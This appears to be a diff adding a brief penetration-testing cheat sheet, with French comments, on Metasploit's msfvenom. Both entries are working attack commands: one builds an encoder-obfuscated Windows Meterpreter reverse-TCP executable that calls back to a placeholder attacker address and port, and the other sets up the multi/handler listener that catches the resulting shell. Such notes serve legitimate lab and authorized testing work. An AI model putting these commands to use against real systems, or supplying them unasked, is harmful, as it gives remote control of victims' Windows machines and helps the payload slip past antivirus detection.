@@ -1,0 +1,7 @@
+--==[ Msfvenom ]==--
+
+#Reverse shell windows
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[ip] LPORT=[port] -f exe -o [shell_name].exe
+
+#Ecoute pour reverse shell windows
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST [ip] set LPORT [port] run
